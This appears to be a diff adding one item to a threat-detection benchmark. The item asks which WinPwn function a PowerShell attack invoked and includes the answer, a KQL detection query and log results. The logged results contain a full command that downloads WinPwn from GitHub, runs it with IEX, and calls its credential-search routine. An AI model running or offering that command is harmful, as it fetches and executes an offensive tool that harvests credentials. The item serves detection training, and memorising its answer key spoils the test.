@@ -1,0 +1,32 @@
+{
+    "technique_id": "T1552.001",
+    "question_id": "75f66e03-37d3-4704-9520-3210efbe33ce",
+    "context": "A Windows host has executed PowerShell code that downloads and runs a script from a remote GitHub repository, then invokes a specific function to search for credentials or other sensitive information.",
+    "objective": "Detect execution of WinPwn’s sensitive-information extraction function by analyzing PowerShell event logs for its invocation.",
+    "technical_details": {
+        "command_analysis": "The malicious command uses IEX to download and run the WinPwn script, then calls the ‘powershellsensitive’ function with consoleoutput and noninteractive flags.",
+        "detection_approach": "Query PowerShell event logs or process events for command lines containing the function name to identify instances when the WinPwn sensitive-data extraction routine was executed."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Phrase the question to ask for the name of the function (tool) used in the PowerShell command. The answer will be a single word matching the function name from the invocation.",
+    "prompt": "On a Windows system, security logs show a PowerShell process downloaded and executed a WinPwn script. Which function name was invoked to perform the search for credentials or other sensitive data?",
+    "answer": [
+        "powershellsensitive"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "let functionName = \"powershellsensitive\";\nDeviceProcessEvents\n| where TimeGenerated >= ago(1d)\n| where FileName =~ \"powershell.exe\" or ProcessCommandLine has \"powershell.exe\"\n| where ProcessCommandLine contains functionName\n      and ProcessCommandLine contains \"-consoleoutput\"\n      and ProcessCommandLine contains \"-noninteractive\"\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessCommandLine",
+    "KQL_validation_message": "KQL query validation successful: The ProcessCommandLine field in the results contains 'powershellsensitive -consoleoutput -noninteractive', which directly matches the expected answer 'powershellsensitive'. This provides clear evidence that the query results contain the required information to answer the detection question.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ProcessCommandLine"
+        ],
+        [
+            "2025-05-07 17:09:15.750449+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive}"
+        ]
+    ]
+}
